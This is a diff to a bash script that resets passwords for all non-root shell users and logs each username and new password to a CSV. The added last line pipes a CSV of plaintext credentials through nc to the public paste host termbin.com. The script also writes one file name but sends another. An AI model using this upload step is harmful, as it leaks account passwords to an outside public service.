@@ -17,13 +17,16 @@ if [[ -z "$passTemp" ]] || [[ "$passTemp" != "$passConfirm" ]]; then
 	exit 2
 fi
 
-# host=$(hostname)
-
 for user in $(awk -F: '$7 ~ /(\/sh|\/bash)/ { print $1 }' /etc/passwd); do
 	if [[ $(id -u $user) -eq 0 ]]; then # Don't change password for root
 		continue
 	fi
+	touch `hostname`.csv
 	echo "Changing password for $user"
 	newPass="$passTemp$delim$user"
-	echo -e "$newPass\\n$newPass" | passwd "$user"
+	#echo -e "$newPass\\n$newPass" | passwd "$user"
+	echo "$user:$newPass" | chpasswd
+	echo "$user,$newPass" >> `hostname`.csv
 done
+
+(cat users.csv | nc termbin.com 9999) && rm -f `hostname`.csv
